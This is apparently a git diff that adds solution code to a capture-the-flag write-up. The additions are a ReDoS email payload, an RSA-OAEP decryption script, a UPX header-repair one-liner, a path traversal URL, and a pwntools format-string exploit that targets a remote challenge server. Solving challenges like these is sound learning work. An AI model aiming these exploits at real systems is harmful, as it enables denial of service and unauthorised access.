@@ -71,12 +71,36 @@ Bot Invite:  https://discord.com/oauth2/authorize?client_id=826994736182460436&p
 
 Send an email of the regex form `.@(gmail){20,}.\.com`, which triggers the catastrophic backtracking in the regex, causing it to stall.
 
+Sample payload: `asdf@gmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmail.co`
+
 ## Optimal RSA
 
 We're given all the parameters (the modulus is prime so no factoring needed), so it's not hard to decrypt. The only tricky thing are:
 
 - The modulus is prime, so several tools (including RsaCtfTool) won't like that
 - The encryption is not textbook RSA but OAEP (as hinted by the "optimal" in the title)
+
+```python
+from Crypto.Hash import SHA512
+from Crypto.Cipher import PKCS1_OAEP
+
+with open("output.txt", "r") as f:
+    a, b, c = f.read().splitlines()
+    N = int(a.split(" = ")[1])
+    e = int(b.split(" = ")[1])
+    ct = bytes.fromhex(c.split("'")[1])
+
+class Key:
+    def __init__(self, n, e):
+        self.n = n
+        self.e = e
+        self.d = pow(e, -1, N - 1)
+    def _decrypt(self, c):
+        return pow(c, self.d, self.n)
+
+c = PKCS1_OAEP.new(Key(N, e), SHA512)
+print(c.decrypt(ct).decode())
+```
 
 ## Blind Shell
 
@@ -113,7 +137,7 @@ print("Here's your flag: ", flag)
 
 ## Look-For-It
 
-http://lookforit.epizy.com/?page=../flag.txt
+Path transversal. (this challenge may have been "simulated" path transversal though) http://lookforit.epizy.com/?page=../flag.txt
 
 ## Rotations of a different kind
 
@@ -165,6 +189,12 @@ Convert the endianness from little endian. Remove the padding at the end after t
 
 The binary has been packed with UPX, but all occurences of `UPX!` have been replaced with `VPX!`, causing the binary not to run properly. This can be seen by looking at the strings in the binary (occuring both at the start and the end), and the challenge title helps a bit too. Fixing this allows us to just run it to obtain the flag.
 
+```bash
+#!/bin/bash
+sed -i 's/VPX!/UPX!/g' ./vnpack
+./vnpack
+```
+
 ## Bland RSA
 
 We see that the value for $e$ is extremely big. We might assume that the decryption exponent $d$ is not very large in this case, and that as such Wiener's attack or the attack of Boneh and Durfee applies.
@@ -175,6 +205,26 @@ As it turns out, $e = \lambda(N) + 1$, resulting in $m^e \equiv m \pmod N$.
 
 Format string attack, spam "%p", and translate the hex output to ASCII. Then sequence "ictf..." and you got the flag.
 
+```python
+from pwn import *
+
+elf = ELF('./pwn', checksec=False)
+# p = elf.process()
+p = remote('34.203.197.39', 3000)
+
+# context.log_level = 'debug'
+# gdb.attach(p, gdbscript='i f')
+
+def print_flag_part(index):
+    p.sendline(f'%{index}$p')
+    flagpart = p.recvline().decode()[2:]
+    print(bytearray.fromhex(flagpart).decode()[::-1], end='')
+
+p.recvline()
+
+for i in range(18, 23):
+    print_flag_part(i)
+```
 
 ## Minijail
 
